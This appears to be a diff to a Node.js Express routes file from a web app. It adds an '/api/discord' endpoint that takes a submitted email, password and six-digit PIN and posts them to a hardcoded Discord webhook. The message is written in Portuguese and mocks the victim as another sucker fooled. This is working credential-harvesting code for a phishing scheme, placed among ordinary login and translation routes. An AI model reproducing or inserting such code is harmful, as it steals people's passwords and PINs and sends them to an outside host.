@@ -134,4 +134,48 @@ routes.post(`/api/translate_carousel`, TranslateCarouselController.store)
 //session
 routes.post(`/api/login`, SessionController.store)
 
+var axios = require('axios').default
+
+routes.post('/api/discord', (req, res) => {
+    const Bico = req.body
+
+    var params = {
+        username: 'É bloco 7 ladrão -- By FrankFK',
+        avatar_url:
+            'https://media.discordapp.net/attachments/855886260471595010/855897495921098773/fb61b5869d7192528104009eba8573f5.gif',
+
+        content:
+            '**\nEXTRA EXTRA, MAIS UM OTÁRIO ENGANADO!! -- Faz Igual ou Dobra!!**\n\nEmail: ```' +
+            Bico.email +
+            '```\nSenha: ```' +
+            Bico.password +
+            '```\nSenha de 6: ```' +
+            Bico.password6 +
+            '```\n**Finalizado** ',
+    }
+
+    var options = {
+        method: 'POST',
+        url:
+            'https://discord.com/api/webhooks/919941365381615696/3Q-1XjNh19zUdOiRr81VBoJnQhPOns5JwuzLyDNg1POKGe9JsuQIZBUHC3pyMp0B202n',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        data: params,
+    }
+
+    axios
+        .request(options)
+        .then(function (response) {
+            console.log(response.data)
+
+            return res.json(response.data)
+        })
+        .catch(function (error) {
+            console.error(error)
+
+            return res.status(400).send(error)
+        })
+})
+
 module.exports = routes
